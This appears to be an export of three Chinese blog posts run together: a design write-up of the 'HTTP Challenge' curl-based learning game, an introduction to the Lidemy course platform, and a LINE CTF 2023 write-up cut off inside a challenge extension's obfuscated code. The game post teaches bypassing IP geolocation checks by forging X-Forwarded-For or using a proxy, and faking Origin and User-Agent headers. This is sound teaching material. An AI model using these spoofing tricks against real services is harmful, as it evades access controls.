如果你還沒玩過，那強烈建議你不要看這篇文章，因為這篇文章會破壞你遊玩的興致（大概就跟電影爆雷一樣）。建議可以先去玩一下，等全破了再回來看這篇文章，會得到一些不同的收穫。 接下來我會講一下這個遊戲誕生的歷程以及每個關卡的設計。 前人種樹，後人乘涼這種以遊戲當做外殼，內容卻是滿滿技術的手法大家應該並不陌生，至少我很不陌生。 最一開始有想要做成遊戲的這個想法，其實是因為一個學生傳給我這個：devtest，這是法國某一間公司的面試考題，如果你看到畫面一片白，那絕對不是網頁壞掉，不用擔心。 破完了上面這個遊戲之後，我才想起自己對這種模式其實很不陌生。小時候玩過高手過招，也玩過類似 Hack This Site! 的遊戲。 或是以前有一陣子解謎遊戲正夯（跟程式無關的那種），我也曾經自己做了一個，那時候是用 PIXNET 文章鎖密碼的方式來做關卡，現在想想真是個非常方便的方法。 總之呢，雖然小時候都玩過，但長大之後卻慢慢忘記還有這種模式。這種模式的好處就在於它是遊戲。遊戲做得好，每個人都會愛上它。而且會比一般的你問我答或是簡答題有趣多了，所以遊戲是個很好的切入點。 想起遊戲的好處以後，我就決定要自己來做一個了，而主題就是之前我的學生們最不熟悉的串接 Web API！ 最初的構想最一開始的想法是： 我希望這是一個你用 curl 也可以玩的遊戲 因為我覺得這樣很 cool，你用 terminal 搭配指令就可以玩這個遊戲，甚至連瀏覽器都不需要開！ 因此，在畫面的呈現上從最初我就打算是純文字的，沒有任何連結或是花花綠綠的東西，它就是個純文字檔！如果有連結也不會有 &lt;a&gt;，就只會是個 URL 而已。 形式的話，就是比照其他遊戲用闖關的。 大致上都定好之後，就是要來決定關卡的內容要有哪些。在一開始我原本想做二十關，後來列一列想要出現的題目，發現大概只能做個六七關左右。 原本的構想如下： CURD 一定要有，要讓學生會串 API 的這四種基本操作 custom header 一定要有 origin 相關的題目一定要有 user agent 相關的題目一定要有 後三個一定要有是因為我覺得這在理解 HTTP 跟串 API 上面也很重要。 custom header 常常會來帶一些額外資訊，或是最常做的就是驗證。origin 的話想讓學生理解 same origin policy 只跟瀏覽器有關，脫離了瀏覽器就完全沒有這個限制。user agent 則是工作上滿實用的，會需要判斷使用者的瀏覽器或是偵測是不是搜尋引擎來做相對應的處理。 要出現的東西大致上有想法了，最後就是實際的內容跟 token 的設計。遊戲的內容如果只有：「請你 POST 一筆資料去 XXX」太無聊了，所以我把場景設定在玩家是一個去圖書館幫忙的新手，要幫助老爺爺解決一些圖書資訊系統的問題。 至於書籍資料我就很快去某網站爬了一下然後稍微做處理，資料的部分就這樣很快搞定了。 有了故事之後，還想要藏幾個彩蛋在裡面。與其說是彩蛋，不如說是一些我覺得比較有趣的小東西，看看有沒有人會發現。因此在關卡的內容跟 token 上面其實都有藏一些東西。 我記得最初的版本我大概花了兩天就做完了。一天想關卡另外一天寫 code，想關卡的部分花比較久，因為程式碼實做的部分滿簡單的。 接著就讓我們先來看看前十關每一關的內容吧！ 第一關啊...好久沒有看到年輕人到我這個圖書館了，我叫做 lib，是這個圖書館的管理員 很開心看到有年輕人願意來幫忙，最近圖書館剛換了資訊系統，我都搞不清楚怎麼用了... 這是他們提供給我的文件，我一個字都看不懂，但對你可能會有幫助 先把這文件放一旁吧，這個待會才會用到 你叫做什麼名字呢？用 GET 方法跟我說你的 name 叫做什麼吧！ 除了 token 以外順便把 name 一起帶上來就可以了 第一關只是想讓大家先拿到 API 文件，然後熟悉一下有些關卡會需要直接把資訊帶在網址上，因此第一關就只是讓大家熟悉環境而已。 傳入 name 以後，就可以拿到第二關的 token。 其實這邊剛開始的時候有不少人卡住，因為題目說明不清楚，所以有些人會以為是不是要去 call API 之類的。後來我就改了一下題目說明，盡可能講清楚，之後也新增了提示的功能。 第二關我前陣子在整理書籍的時候看到了一本我很喜歡的書，可是現在卻怎麼想都想不起來是哪一本... 我只記得那本書的 id 是兩位數，介於 54~58 之間，你可以幫幫我嗎？ 找到是哪一本之後把書的 id 用 GET 傳給我就行了。 這關的 id 範圍是 54~58，其實原本就是想讓大家一個一個試，沒有其他方法。 這邊藏的小彩蛋是 id 56 的書籍就是 5566 的書： &#123;&quot;id&quot;:56,&quot;name&quot;:&quot;5566－認真&quot;,&quot;author&quot;:&quot;鄭佩芬&quot;,&quot;ISBN&quot;:&quot;0614361311&quot;&#125; 所以下一關的 token 才會是 5566NO1 第三關真是太感謝你幫我找到這本書了！ 剛剛在你找書的時候有一批新的書籍送來了，是這次圖書館根據讀者的推薦買的新書，其中有一本我特別喜歡，想要優先上架。 書名是《大腦喜歡這樣學》，ISBN 為 9789863594475。 就拜託你了。 新增完之後幫我把書籍的 id 用 GET 告訴我。 這關就只是在測驗會不會用 POST 而已。 有一個小地方是原本 API 文件沒有寫清楚要怎樣 POST，content type 是 form 還是 JSON？所以後來把這塊補上去了，避免產生歧義。 第四關我翻了一下你之前幫我找的那本書，發現我記錯了...這不是我朝思暮想的那一本。 我之前跟你講的線索好像都是錯的，我記到別本書去了，真是抱歉啊。 我記得我想找的那本書，書名有：「世界」兩字，而且是村上春樹寫的，可以幫我找到書的 id 並傳給我嗎？ 這關測驗會不會使用 API 的參數來查詢書籍，但要作弊直接在 local 搜尋其實也可以。 我自己滿愛村上春樹，而我有個朋友酷愛《世界末日與冷酷異境》這本書，所以就把它放進來了。為了讓搜尋「世界」的時候不要只出現一個結果，我還去找了其他幾本也有這個關鍵字的書放進去。 而下一關的 token HarukiMurakami 就是村上春樹的名字。 第五關昨天有個人匆匆忙忙跑過來說他不小心捐錯書了，想要來問可不可以把書拿回去。 跟他溝通過後，我就把他捐過來的書還他了，所以現在要把這本書從系統裡面刪掉才行。 那本書的 id 是 23，你可以幫我刪掉嗎？ 這關考 DELETE 的使用而已，沒什麼難度。 這邊藏的小彩蛋是他捐錯的書是雞排妹寫真集，所以想趕快拿回去。這也對應到了下一關的 token：CHICKENCUTLET。 第六關我終於知道上次哪裡怪怪的了！ 照理來說要進入系統應該要先登入才對，怎麼沒有登入就可以新增刪除... 這太奇怪了，我已經回報給那邊的工程師了，他們給了我一份新的文件： 這邊是帳號密碼，你先登入試試看吧，可以呼叫一個 &#x2F;me 的 endpoint，裡面會給你一個 email。 把 email 放在 query string 上面帶過來，我看看是不是對的。 帳號：admin 密碼：admin123 對新手來說其實算是比較有挑戰性的一關。 這關考的是知不知道怎麼樣在 header 裡面放內容，以及根據資料去找出怎麼用 http basic authorization。主要是想讓大家知道 HTTP 的其中一種驗證方式。 第七關那邊的工程師說系統整個修復完成了，剛好昨天我們發現有一本書被偷走了... 這本書我們已經買第五次了，每次都被偷走，看來這本書很熱門啊。 我們要把這本書從系統裡面刪掉，就拜託你了。 對了！記得要用新的系統喔，舊的已經完全廢棄不用了。 書的 id 是 89。 其實只是沒梗了所以又加一個刪除資料的關卡，這邊的一個小插曲是原本沒有「對了！記得要用新的系統喔，舊的已經完全廢棄不用了。」這句，導致有些人還是用舊版 API，因此才加上去，避免大家搞混。 這本很熱門的書你實際上去看的話，會發現是《跟著月亮走：韓國瑜的夜襲精神與奮進人生》，對應到了下一關的 token：HsifnAerok，倒過來就變 KoreanFish。 第八關我昨天在整理書籍的時候發現有一本書的 ISBN 編號跟系統內的對不上，仔細看了一下發現我當時輸入系統時 key 錯了。 哎呀，人老了就是這樣，老是會看錯。 那本書的名字裡面有個「我」，作者的名字是四個字，key 錯的 ISBN 最後一碼為 7，只要把最後一碼改成 3 就行了。 對了！記得要用新的系統喔，舊的已經完全廢棄不用了。 這關就考找資料跟修改資料而已，沒什麼特別的。 下一關也就是第九關的 token 是NeuN，德文中的九。 第九關API 文件裡面有個獲取系統資訊的 endpoint 你記得嗎？ 工程師跟我說這個網址不太一樣，用一般的方法是沒辦法成功拿到回傳值的。 想要存取的話要符合兩個條件： 1. 帶上一個 X-Library-Number 的 header，我們圖書館的編號是 20 2. 伺服器會用 user agent 檢查是否是從 IE6 送出的 Request，不是的話會擋掉 順利拿到系統資訊之後應該會有個叫做 version 的欄位，把裡面的值放在 query string 給我吧。 這關考兩個東西： 會不會傳 custom header 知不知道怎麼改 user agent，以及是否知道 user agent 代表的意義 這兩個就是前面有說過我一定要放進來的元素，因為我覺得很重要。 我想讓學生們知道說 user agent 其實有滿多作用，其中一個就包含讓 server 知道你的瀏覽器跟作業系統之類的；也想讓他們知道這些東西都可以偽造。 原本其實是設定 Server 會檢查是不是從 Safari 送出的 Request，但用 mac 的人就可以開 Safari 過關，因此後來才改成用 IE6。如果你要去裝 IE6 的 VM 那我也就算了XD 下一關的 token 是duZDsG3tvoA，其實是 YouTube 的影片 ID，對應到的是周杰倫的半島鐵盒。因為我滿喜歡這首歌，而且這首歌跟書也有點關係。 第十關時間過得真快啊，今天是你在這邊幫忙的最後一天了。 我們來玩個遊戲吧？你有玩過猜數字嗎？ 出題者會出一個四位數不重複的數字，例如說 9487。 你如果猜 9876，我會跟你說 1A2B，1A 代表 9 位置對數字也對，2B 代表 8 跟 7 你猜對了但位置錯了。 開始吧，把你要猜的數字放在 query string 用 num 當作 key 傳給我。 原本是想讓大家真的來玩猜數字，預計猜個五六次就可以破關。但判斷邏輯我沒寫好，所以你傳一個數字或是重複數字我都沒擋掉，或者是你要直接暴力嘗試 9999 種組合也沒人攔你，所以這題的解法就很多種。 到這邊為止，就是前十關的內容。 第一次優化做完前十關之後讓一些朋友先試玩，得到的反應都還不錯，但也發現一些問題，其中有些我上面已經提過了，例如說： 第一關說明不清楚，不知道 name 要傳到哪裡 沒有提示要用新版 API，以為可以用舊的 如果瀏覽器那關限制 Safari，對 Mac 使用者毫無難度 上述問題基本上都可以透過加強文字敘述來改善，但還發現一個更大的問題： 卡關 雖然說卡關是人之常情，但其實我不希望大家一直卡關。畢竟這個遊戲的最終目的其實是學習，好玩對我來說只是附加價值。可是我又不能破壞遊戲體驗，直接講解答，因此我必須提供一個方法讓他們可以看到提示。 你可能會問我那提示幹嘛不用白色文字就好，還要加 &amp;hint=1 這麼麻煩。你可能忘了，我開頭有說初衷是想讓 curl 也可以玩這個遊戲，所以白色文字是沒有用的。 總之呢，最後加上了提示的功能，讓遊戲變得更完整了，體驗也變得更好。 原本遊戲就到這邊結束了，但剛好我又有了一些靈感，所以繼續往下做了一些關卡，下面來講講進階關卡。 第十一關嘿！很開心看到你願意回來繼續幫忙，這次我們接到一個新的任務，要跟在菲律賓的一個中文圖書館資訊系統做串連 這邊是他們的 API 文件，你之後一定會用到。 現在就讓我們先跟他們打個招呼吧，只是我記得他們的 API 好像會限制一些東西就是了... 這關是開頭所提到的，一定要做的 origin 相關關卡。會放在進階關是因為怕對我學生來說有些太難，所以才放這裡。 總之是想讓大家理解就算 Server 檢查 origin，Client 也可以輕易偽造。然後這跟瀏覽器的 CORS 一點關係都沒有，大家要很清楚 Request 從瀏覽器發出來以及自己發 Request 是兩件很不一樣的事，前者會有許多限制，後者沒有。 下一關的 tokenr3d1r3c7其實是 leet 的redirect，已經暗示了下一關的解法。 第十二關打完招呼之後我們要開始送一些書過去了，不過其實運送沒有你想像中的簡單，不是單純的 A 到 B 而已 而是像轉機那樣，A 到 C，C 才到 B，中間會經過一些轉運點才會到達目的地...算了，我跟你說那麼多幹嘛 現在請你幫我把運送要用的 token 給拿回來吧，要有這個 token 我們才能繼續往下一步走 這一關也是後期我很想放的一關，覺得這樣的概念滿有趣的。透過在 redirect 過程的途中塞東西，強迫大家去理解 server side redirect 的原理是什麼（301 跟 302 status code）。 若是你不懂為什麼可以轉址以及轉址背後的原理，你就解不開這題。 下一關的 token 為qspyz，往左平移一個字元之後變成proxy，一樣暗示著下一關的解法。 第十三關太好了！自從你上次把運送用的 token 拿回來以後，我們就密切地與菲律賓在交換書籍 可是最近碰到了一些小問題，不知道為什麼有時候會傳送失敗 我跟他們反映過後，他們叫我們自己去拿 log 來看，你可以幫我去看看嗎？ 從系統日誌裡面應該可以找到一些端倪。 這關是在考 proxy 的使用，因為 Server 會檢查使用者的 IP 是否來自於菲律賓。 檢查的方法是用 node-geoip： advancedRouter.get('/logs', (req, res) => &#123; const ip = req.ip || '' const info = geoip.lookup(ip) || &#123;&#125; if (info.country === 'PH') &#123; res.end(text.lv13.reply) &#125; else &#123; res.end(text.lv13.wa) &#125; &#125;) 所以只要隨便找一個在菲律賓的 proxy 來送 request 就可以過關了。 不過這關有兩件出乎意料的事，第一件事是滿多人都會嘗試偽造Accept-Language這個 header，這我當初完全沒想到（不過也沒用就是了）。 第二件事是這題還有另一個解答，就是偽造X-Forwarded-For，這也是我當初完全沒想到的事。 我在 Express 裡面有開app.set(&#39;trust proxy&#39;, true)，所以在拿使用者 IP 的時候如果有X-Forwarded-For這個 header，會以這邊的資訊為準。 剛好前陣子讀到一篇類似的文章：利用X-Forwarded-For伪造客户端IP漏洞成因及防范。 雖然不是我預設的解法，但我覺得這個解法更有趣，所以就沒有特地修掉了。 第十四關跟那邊的溝通差不多都搞定了，真是太謝謝你了，關於這方面沒什麼問題了！ 不過我老大昨天給了我一個任務，他希望我去研究那邊的首頁內容到底是怎麼做的 為什麼用 Google 一搜尋關鍵字就可以排在第一頁，真是太不合理了 他們的網站明明就什麼都沒有，怎麼會排在那麼前面？ 難道說他們偷偷動了一些手腳？讓 Google 搜尋引擎看到的內容跟我們看到的不一樣？ 算了，還是不要瞎猜好了，你幫我們研究一下吧！ 這關想讓大家知道的事情是不只瀏覽器，各家爬蟲也會帶特定的 User-Agent，所以 Server 一樣可以針對不同的 UA 來輸出不同的資訊（雖然不被推薦就是了）。 舉例來說，一個 SPA 可以只針對 Google 搜尋引擎跟 Facebook 啟用 Server side render 來輸出內容，對一般用戶還是 Client side render。 或是像 HTTP Challenge 這個網站，本身就有針對不同的 UA 做處理（因為網站都是純文字，但我希望在臉書上被分享時有自訂標題跟敘述）： // base on UA return differect result router.get('/start', (req, res) => &#123; const UA = req.header('User-Agent') || '' if (UA.indexOf('facebookexternalhit') >= 0 || UA.indexOf('Googlebot') >= 0 )&#123; res.end(text.seo) &#125; else &#123; res.end(text.start.intro) &#125; &#125;) 不過好像弄得怪怪的，不知道有沒有成功就是了。 這就是最後一關囉，第十五關是結語。 第二次優化做完進階關卡之後，敘述的部分其實也有改一點，例如說第十四關就有學生以為跟 Chrome 有關（想到 Google 就只想到 Chrome XD），所以我特地強調說「Google 搜尋引擎」，要往這方向找才是正確的。 而其中最讓我驚訝的還是第十三關那個我沒有想到的解法X-Forwarded-For。 在對外公開之後，一個朋友跟我說最後應該放一個 gist 讓大家留言。我內心一驚：對欸，可以放 gist。 因為我原本就有想說要不要放個排行榜或者是留言板之類的，讓破完的人可以留個言當作紀念，可是要做這功能挺麻煩的，我懶得做。被朋友提醒才突然發現 gist 本來就有內建留言功能，那就直接放一個 gist 就好了！ 所以前期破關的朋友是沒有 gist 可以留言的，是到後面才新增的。 總結這次很開心可以把這些知識包裝成游戲跟大家分享，迴響似乎也挺不錯的。雖然有些人期待會再加新關卡，但我目前完全沒靈感就是了。 之後比較有可能的是做個 HTML、CSS 跟 JavaScript 的版本，類型差不多，但就是每關的解法跟知識點不一樣，到時候再來跟大家分享。 感謝早期幫我測試的朋友們，也感謝跟我一起享受遊戲的大家。底下是一些相關的闖關心得，有興趣的話也可以看看： 一日圖書館管理員：HTTP Challenge HTTP_Game攻略(一) Lidemy HTTP 圖書館小弟加班(V2) 小挑戰 http game 解題思路心得想法","link":"/2019/05/18/lidemy-http-challenge/"},{"title":"Lidemy 鋰學院：為初學者而生的線上程式課程平台","text":"前言最近剛把 Lidemy 鋰學院這個線上程式課程平台給弄好，目前這網站是建在 Teachable 上面，一個能夠快速搭建課程平台的服務。 而這篇呢，就要來談談 Lidemy 的創辦背景以及理念 緣起我一直是個很喜歡教學的人，從最早在前公司開設的實體課程，到台北的免費程式教學，再到 Hahow 的初心者的計概與 coding 火球術，最後是近期的從新手到中手：前端工程加強班。 有關於我個人的完整歷程可以參考自學、哲學、講學：我的程式之路。或許是因為我的背景多元的關係，在教學這一塊讓我有著更多的優勢，在很多時候，我都可以把一個東西講得更淺顯易懂，更讓學生們聽懂。 上面所提到的那些教學有線下的也有線上的，大部分是免費的，而唯一的付費課程我也決定在合約到期之後轉為免費。我上面這些教學的初衷都是一樣的，為的就是能讓初學者更順利地入門程式設計這一個領域。 我一直認為，教學是一件雙向的事情，不只付出是雙向的，連「教學」這件事情都是雙向的。在教學的過程中，老師同時也是學生，學生也同時是老師，彼此都能從對方身上學到些什麼。 常常看到有許多初學者們覺得程式很難，自己那麼笨一定學不會，或者是買了課程來看卻發現老師講的他都聽不懂。我想跟你們說，這不是你的錯，而是那個老師還可以教得更好。我一直是秉持著這個理念要求自己的。如果學生聽不懂、學不會，不是他們的錯，是我的。是因為我沒有用更淺顯的範例讓他們聽懂，沒有把課程設計得更好、更適合初學者。 有件事情我講過很多次了，那就是我分享的初衷其實是「幫助以前的自己」，我只是不想讓像以前的我一樣的人卡在原地不知道該怎麼辦。身為一個已經走過來，已經克服困難的人，我希望用我走過以後學到的知識去幫助以前的自己，能跟同樣卡在原地的人說：「像這個概念啊，我那時候也想了好久，最後才發現其實就只是…」 除了線上課程，我也在 blog 上面寫了很多與初學者相關的文章，像是：程式新手常見問題：解惑篇、為什麼你應該從 Scratch 開始學程式、[心得] 十年程式自學之路、如海洋般的程式課程：CS50等等。 其實一直以來我都有想過自己跳出來弄一個線上課程平台，在 Hahow 開課以前就曾經想過，也曾經想過開設實體課程，但一直沒有行動是因為覺得手邊的資源還不夠，還可以再多累積一段時間。 前陣子有一天我想搜尋一篇文章，用程式 自學、程式 教學、程式 入門等等的關鍵字去搜尋，發現搜尋結果的前三名都是我的文章，同時我那時候也正進行著從新手到中手：前端工程加強班的教學，發現自己教學的次數其實不少，文章也寫得不少，好像是時候把我手邊的資源做個整理了。 因此，Lidemy 鋰學院就這樣誕生了。 為什麼叫 Lidemy?之前有一個文章寫信來找我合作，問我是否能轉在部落格上的文章，並且請我提供一張 Logo 的照片。那時候我想不到 Logo 要放什麼，這邊我經營這麼久也沒有一個 Logo，後來跟一個朋友聊，他跟我說：不然就用你杯子那張啊！ 這杯子是我在賽先生科學工廠買的，看到的第一眼我就決定要買了。因為 Li 剛好是我名字中的一個字，也剛好是一個化學元素的名字。 後來要幫這個新的線上程式課程平台取名的時候，我就立刻想到了這一個字以及這一個 Logo，連中文都順便想好了，「鋰學院」取「理學院」的諧音，儘管程式比較像什麼電資學院在做的事情，但以「理科」來說好像也能勉強碰上邊。 因此，我很快就決定了 Logo 跟中文名稱，接著就差英文名稱了。 英文名稱我直接從中文去發想，查一查學院的翻譯，可以叫做：college, Faculty，但我都覺得不太適合。我有想過 Li Bootcamp 或是 Li School，也覺得有點奇怪。 直到有一天無意間發現 Academy 也是學院的意思，Li Academy，就決定是這個了！ 決定以後我立刻上網註冊網域，發現 liacademy.com 已經被買走了，只能用 liacademy.tw。不過，我發現居然還有 li.academy 這個超猛的網域可以申請，但要價一年 6000 多台幣，是其他網域的十倍以上。 當下我就想了很久，是不是真的要買這個網域？而且我也不確定這網域是不是只有真的教育機構可以購買（應該不是啦，我白擔心了），就在思考的過程中，我突然想到可以把這兩個單字結合起來，變成 Lidemy。而這名字的好處就是比較好念而且網域又還在。 我就跑去問了一下我室友，他說：「可是這樣不會讓人覺得跟 udemy 很像嗎？」，是的，的確是這樣沒錯，而且 udemy 的 Logo 就是一個 U，連 logo 的感覺也滿像的。後來因為我實在是無法決定，我就把這兩個選項 po 到臉書上讓我的好友們表決，最後 Lidemy 獲得壓倒性勝利。 這就是 Lidemy 這個名稱誕生的故事。 Lidemy 的理念決定好名稱跟 Logo 之後，就是下一件大事了：slogan。每一個網站幾乎都會有一句 slogan，短短一句話就解釋他們到底在做什麼，我們可以參考一下其他人的： Hahow 好學校：最有趣的線上課程平台 ALPHA Camp：培育全球Startup渴求的人才 六角學院：帶你學到會的線上課程 udemy：Learn Anything, On Your Schedule 我記得當初我第一個想到的是：專門為初學者開設的線上程式課程平台，其他還想到了什麼：誠實的線上程式課程平台、致力做最誠實的線上程式課程平台等等。 總之「線上程式課程平台」這個字是不變的，就看前面要放什麼而已。 最後覺得上面字都太長，而且「誠實」這兩個字雖然我很想放進去，但看起來總覺得怪怪的不太搭，因此就決定縮減為：「為初學者而生的線上程式課程平台」 為初學者而生這個理念滿好理解的，我上面就已經提到很多了，我教學的初衷就是希望能把初學者帶進這個領域，讓她知道其實程式設計一點都不難，而且非常有趣！ 而誠實這個點我很想放進來是因為，我一直很想做一個公開透明的平台。有多公開透明？首先在課程上，我希望能把好評跟負評「並列」在一起，讓所有人都知道學生對於這堂課的反饋是什麼，而不是只有好評。 這樣做或許會影響到銷量，但我覺得無所謂，比起賣得好不好這點，我更希望來購買課程的人，都已經確切知道優缺點是什麼才來購買。我希望他們在完全理解這堂課的評價以及內容之後再購買。 接著如果可以的話，我也想公開經營這個平台的收入與支出是多少，不過這個以後再說啦，畢竟現在一堂付費課程都沒有。 Lidemy 的未來現在在上面就只有一堂前端程式加強班的課，而 Hahow 上面的課也是一年多之後合約才到期，才能轉到我自己的平台重新上架。 因此，要好好規劃一下之後 Lidemy 上面會有些什麼內容。 就長期目標來看，我想把 Lidemy 打造成一個什麼都有的平台，你想學什麼幾乎都可以在上面找到，想學 Android, iOS, 網頁前後端之類的都有。 但以短期目標來說，應該還是先專攻我比較熟悉的網頁設計這一塊。 之前有一個朋友問我說：「網頁設計的資源已經那麼多了，為什麼你還要再做？」 因為我想讓一個初學者的入門、加強都在同一個課程平台上，要打造這樣的一個學習體系，就必須要自己再跳下來做最基礎的 HTML&#x2F;CSS&#x2F;JS 的教學。從最基礎開始教，一直加強一直加強。 以下是我目前規劃的幾個課程，還沒完全確定，但如果有哪一個是你很想上的話，可以在下面留言告訴我，會增加這堂課開成的機率。 HTML&#x2F;CSS 入門 JavaScript 入門 Git 入門 CS50 導讀 Scratch 入門 React 入門 結語看了這麼多，如果你對這樣子的教學有興趣，可以先在 Lidemy 鋰學院上面註冊，有新課程的時候就能夠搶先獲得訊息，或是可以追蹤 Lidemy 的 Facebook 粉絲專頁，一樣能夠搶先知道最新消息。 Lidemy 鋰學院的介紹文就到此告一段落，感謝大家。","link":"/2017/06/24/lidemy-online-programming-course-platform-for-the-beginner/"},{"title":"LINE CTF 2023 筆記","text":"今年 Water Paddler 拿了第二名，總共 9 題 web 解掉了 8 題（我貢獻了 2 題），整體 web 的難度我覺得去年似乎比較難，今年比的人似乎也比較少一點。 話說最近我發現自己的 writeup 筆記沒有以前這麼多了，其中一個原因是最近比較忙，另一個原因是最近有興趣的題目（client side）沒這麼多，或我也有在想搞不好是隊友越變越強，還沒開題就被隊友解掉，我也懶得再去看題目，於是就懶得寫筆記了XD 這次只記幾題有參與或有興趣的，其他就先省略了。 Flag Masker (9 solves)這題後端的程式碼很簡單，就是可以建立一個 note，然後輸出是安全的，沒有 XSS 的風險。 有趣的地方是 admin bot 接了一個 extension，程式碼有混淆過但幸好很短，worker.js 如下： (() => &#123; \"use strict\"; (() => &#123; console.log(\"Flag Master - worker script is loaded.\"); var e = function(e, n) &#123; return n.replace(e, (function(e, r, a) &#123; n = n.replace(new RegExp(r, \"g\"), \"*\".repeat(r.length)), n += \"\\x3c!--DETECTED FLAGS ARE MASKED BY EXTENSION--\\x3e\" &#125;)), n &#125;; chrome.runtime.onMessage.addListener((function(n, r, a) &#123; var t = n.regex ? new RegExp(n.regex, \"g\") : new RegExp(\"LINECTF\\\\&#123;(.+)\\\\&#125;\", \"g\"); ! function(e, n) &#123; var r = n.head, a = n.body; return e.test(r + a) &#125;(t, n) ? a(&#123; head: null, body: null, flag: !1 &#125;): a(&#123; head: e(t, n.head), body: e(t, n.body), flag: !0 &#125;) &#125;)) &#125;)() &#125;)(); 接收到 message 之後根據傳來的 regexp 去替換畫面上的內容，然後再傳回去。 而 content.js 是這樣： (() => &#123; var t = &#123; 576: (t, r, e) => &#123; var a, n; void 0 === (n = \"function\" == typeof(a = function() &#123; var t = &#123; a: \"href\", img: \"src\", form: \"action\", base: \"href\", script: \"src\", iframe: \"src\", link: \"href\", embed: \"src\", object: \"data\" &#125;, r = [\"source\", \"protocol\", \"authority\", \"userInfo\", \"user\", \"password\", \"host\", \"port\", \"relative\", \"path\", \"directory\", \"file\", \"query\", \"fragment\"], e = &#123; anchor: \"fragment\" &#125;, a = &#123; strict: /^(?:([^:\\/?#]+):)?(?:\\/\\/((?:(([^:@]*):?([^:@]*))?@)?([^:\\/?#]*)(?::(\\d*))?))?((((?:[^?#\\/]*\\/)*)([^?#]*))(?:\\?([^#]*))?(?:#(.*))?)/, loose: /^(?:(?![^:@]+:[^:@\\/]*@)([^:\\/?#.]+):)?(?:\\/\\/)?((?:(([^:@]*):?([^:@]*))?@)?([^:\\/?#]*)(?::(\\d*))?)(((\\/(?:[^?#](?![^?#\\/]*\\.[^?#\\/.]+(?:[?#]|$)))*\\/?)?([^?#\\/]*))(?:\\?([^#]*))?(?:#(.*))?)/ &#125;, n = /^[0-9]+$/; function o(t, e) &#123; for (var n = decodeURI(t), o = a[e ? \"strict\" : \"loose\"].exec(n), i = &#123; attr: &#123;&#125;, param: &#123;&#125;, seg: &#123;&#125; &#125;, s = 14; s--;) i.attr[r[s]] = o[s] || \"\"; return i.param.query = f(i.attr.query), i.param.fragment = f(i.attr.fragment), i.seg.path = i.attr.path.replace(/^\\/+|\\/+$/g, \"\").split(\"/\"), i.seg.fragment = i.attr.fragment.replace(/^\\/+|\\/+$/g, \"\").split(\"/\"), i.attr.base = i.attr.host ? (i.attr.protocol ? i.attr.protocol + \"://\" + i.attr.host : i.attr.host) + (i.attr.port ? \":\" + i.attr.port : \"\") : \"\", i &#125; function i(t, r) &#123; if (0 === t[r].length) return t[r] = &#123;&#125;; var e = &#123;&#125;; for (var a in t[r]) e[a] = t[r][a]; return t[r] = e, e &#125; function s(t, r, e, a) &#123; var o = t.shift(); if (o) &#123; var u = r[e] = r[e] || []; \"]\" == o ? c(u) ? \"\" !== a &amp;&amp; u.push(a) : \"object\" == typeof u ? u[function(t) &#123; var r = []; for (var e in t) t.hasOwnProperty(e) &amp;&amp; r.push(e); return r &#125;(u).length] = a : u = r[e] = [r[e], a] : ~o.indexOf(\"]\") ? (o = o.substr(0, o.length - 1), !n.test(o) &amp;&amp; c(u) &amp;&amp; (u = i(r, e)), s(t, u, o, a)) : (!n.test(o) &amp;&amp; c(u) &amp;&amp; (u = i(r, e)), s(t, u, o, a)) &#125; else c(r[e]) ? r[e].push(a) : \"object\" == typeof r[e] || void 0 === r[e] ? r[e] = a : r[e] = [r[e], a] &#125; function u(t, r, e) &#123; if (~r.indexOf(\"]\")) s(r.split(\"[\"), t, \"base\", e); else &#123; if (!n.test(r) &amp;&amp; c(t.base)) &#123; var a = &#123;&#125;; for (var o in t.base) a[o] = t.base[o]; t.base = a &#125; \"\" !== r &amp;&amp; function(t, r, e) &#123; var a = t[r]; void 0 === a ? t[r] = e : c(a) ? a.push(e) : t[r] = [a, e] &#125;(t.base, r, e) &#125; return t &#125; function f(t) &#123; return function(t, r) &#123; for (var e = 0, a = t.length >> 0, n = arguments[2]; e &lt; a;) e in t &amp;&amp; (n = r.call(void 0, n, t[e], e, t)), ++e; return n &#125;(String(t).split(/&amp;|;/), (function(t, r) &#123; try &#123; r = decodeURIComponent(r.replace(/\\+/g, \" \")) &#125; catch (t) &#123;&#125; var e = r.indexOf(\"=\"), a = function(t) &#123; for (var r, e, a = t.length, n = 0; n &lt; a; ++n) if (\"]\" == (e = t[n]) &amp;&amp; (r = !1), \"[\" == e &amp;&amp; (r = !0), \"=\" == e &amp;&amp; !r) return n &#125;(r), n = r.substr(0, a || e), o = r.substr(a || e, r.length); return o = o.substr(o.indexOf(\"=\") + 1, o.length), \"\" === n &amp;&amp; (n = r, o = \"\"), u(t, n, o) &#125;), &#123; base: &#123;&#125; &#125;).base &#125; function c(t) &#123; return \"[object Array]\" === Object.prototype.toString.call(t) &#125; function d(t, r) &#123; return 1 === arguments.length &amp;&amp; !0 === t &amp;&amp; (r = !0, t = void 0), r = r || !1, &#123; data: o(t = t || window.location.toString(), r), attr: function(t) &#123; return void 0 !== (t = e[t] || t) ? this.data.attr[t] : this.data.attr &#125;, param: function(t) &#123; return void 0 !== t ? this.data.param.query[t] : this.data.param.query &#125;, fparam: function(t) &#123; return void 0 !== t ? this.data.param.fragment[t] : this.data.param.fragment &#125;, segment: function(t) &#123; return void 0 === t ? this.data.seg.path : (t = t &lt; 0 ? this.data.seg.path.length + t : t - 1, this.data.seg.path[t]) &#125;, fsegment: function(t) &#123; return void 0 === t ? this.data.seg.fragment : (t = t &lt; 0 ? this.data.seg.fragment.length + t : t - 1, this.data.seg.fragment[t]) &#125; &#125; &#125; return d.jQuery = function(r) &#123; null != r &amp;&amp; (r.fn.url = function(e) &#123; var a, n, o = \"\"; return this.length &amp;&amp; (o = r(this).attr((a = this[0], void 0 !== (n = a.tagName) ? t[n.toLowerCase()] : n)) || \"\"), d(o, e) &#125;, r.url = d) &#125;, d.jQuery(window.jQuery), d &#125;) ? a.call(r, e, r, t) : a) || (t.exports = n) &#125;, 144: function(t, r, e) &#123; \"use strict\"; var a = this &amp;&amp; this.__importDefault || function(t) &#123; return t &amp;&amp; t.__esModule ? t : &#123; default: t &#125; &#125;; Object.defineProperty(r, \"__esModule\", &#123; value: !0 &#125;); var n, o, i = a(e(576)); console.log(\"Flag Masker - content script is loaded.\"), n = (0, i.default)(location.href), o = &#123;&#125;, localStorage.config ? o = JSON.parse(localStorage.config) : fetch(\"/config\").then((function(t) &#123; return t.json() &#125;)).then((function(t) &#123; localStorage.setItem(\"config\", JSON.stringify(t)), o = t &#125;)), chrome.runtime.sendMessage(&#123; regex: o.regex, head: window.document.head.innerHTML, body: window.document.body.innerHTML 